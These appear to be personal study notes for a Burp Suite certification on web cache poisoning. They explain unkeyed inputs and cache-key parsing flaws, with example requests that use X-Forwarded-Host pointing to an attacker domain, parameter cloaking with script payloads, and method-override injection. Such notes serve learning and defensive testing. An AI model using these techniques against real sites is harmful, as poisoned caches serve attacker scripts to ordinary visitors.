##### PortSwigger BurpSuite Certification Summary
# Web Cache Poisoning
Cache poisoning is when an attacker is able to inject a malicious version of a website into the cache. If users then access that websites and get served by the cached version, the exploit is executed. One significant factor is the data that is considered when deciding if a website is cached or should be served by the backend. This usually does not include the full set of parameters on a website. Left out inputs are called *unkeyed* and identifying those is the first step in constructing an atttack.

## Exploiting Design Flaws

### Identify Unkeyed Inputs
The whole idea is to inject a payload into a unkeyed input so that it will be served by the backend-server and cached. The extension *Param Miner* sends multiple requests and notifies if there is an unkeyed input found. This can be seen in the issues in Burp.
### Elicit a Harmful Response
Once an unkeyed input is found, the goal is to understand how it can be used malicously. This being done, this response must then be cached. This can be tricky and require trying out different versions and seeing what happens to them.

One can see if the response has been served by the cache by the header
```
X-Cache: hit
```

### Delivering the Exploit
There are multiple ways:
* Unsafe handling of resource imports
	```
	GET / HTTP/1.1
	Host: innocent-website.com
	X-Forwarded-Host: evil-user.net
	User-Agent: Mozilla/5.0 Firefox/57.0
	
	HTTP/1.1 200 OK
	<script src="https://evil-user.net/static/analytics.js"></script>
	```
	The attacker can then host the loaded JS file themselves and give their domain to load it from.
* Though rare, as the users will see the impact in bad usability, cookies can be used. The context is crucial here, e.g. the cookie value could be used within a script and classic escaping techniques must be used.
* Sometimes multiple headers need to be used:
	```
	X-Forwarded-Host: ATTACKER-HOST
	X-Forwarded-Scheme: ggez
	```
	In this case, the forwarded scheme must not be HTTPS and by adding the forwarded host, the victim will be redirected to the attacker host.

The `Vary` header can make certain inputs be keyed in order to distinguish for example different user agents. This can be used to direct the attack to certain users.

#### Headers
```
X-Host
X-Forwarded-Host
X-Forwarded-Scheme

```

## Cache Implementation Flaws
They offer a greater attack surface and can reach even caches on an application level. The concept relies on the fact that inputs are often transformed in some way before being used in the cache key.

### Identifying a Cache Oracle
This happens on a page that provides feedback on the caches behaviour. Some aspects to consider are:
* Does it come from the cache or the backend-server?
	* In the HTTP header
	* Changes to dynamic content
	* Response times
* The URL and query parameters are optimally reflected on the page
* Is a third-party cache in use? Check the documentation

### Probe the Key Handling
The next step is to evaluate how the keys are handled. If some part of the input is discarded, such as the port of a host, it means that this could be a way of injecting a payload.

Example:
The query parameters are not keyed and reflected within the response. The payload can therefore be injected with the URL and the site with it will be cached. Since the parameters do not influence the caching, a user who enters the normal website (i.e. without any parameters) will still be served with the malicious version in the cache.7

Example:
Some query parameters are not considered. One such candidate is the `utm_content` parameter.

Example:
The cache exludes some harmless parameter, thus it can't be directly used. Any useful parameter is keyed.

Most logic considers only the first questionmark and then looks for the ampersand in the parameters. Some poorly written parsing algorithms will treat any ? as the start of a new parameter, regardless of whether it's the first one or not.

Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first ? as a delimiter. The attack would then look like this:
```
GET /?example=gg?harmless_parameter=<script>alert(1)</script>
```

Example:
The opposite of the above example is the case.
Ruby on Rails will consider the semicolon as a delimiter as well as the ampersand, however most caches do not. This offers the following method of injecting a payload into a useful, keyed parameter:
```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
While the cache will interpret this as two parameters and discard everything after the first keyed parameter, the server won't do this and interpret it as three separate parameters. If the final occurrence of a parameter is considered, the attack works.

Example:
The server might choose a parameter served in the body over the one in the URL. The cache does not consider the parameter in the body keyed, so the attack looks something like this:
```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```
The override can help in that the server considers the body's parameter.

Example:
The cache normalizes the keyed input and thus decodes the from the server URL encoded string, making it executable. Therefore, a reflected XSS attack can be enabled, even though URL ecnoding takes place.

